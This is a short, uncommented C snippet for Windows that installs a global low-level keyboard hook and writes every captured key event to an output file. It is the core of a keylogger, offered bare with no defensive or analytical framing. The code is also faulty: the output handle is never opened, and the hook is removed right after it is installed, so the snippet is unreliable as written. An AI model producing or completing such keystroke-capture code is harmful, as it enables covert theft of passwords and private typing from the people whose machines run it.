#include <windows.h>
HANDLE output;
LRESULT CALLBACK keyboard_event(int code, WPARAM kind, LPARAM payload) {
    DWORD written;
    WriteFile(output, (const void *)payload, sizeof(KBDLLHOOKSTRUCT), &written, NULL);
    return CallNextHookEx(NULL, code, kind, payload);
}
void record_keys(void) {
    HHOOK hook = SetWindowsHookExW(13, keyboard_event, NULL, 0);
    UnhookWindowsHookEx(hook);
}
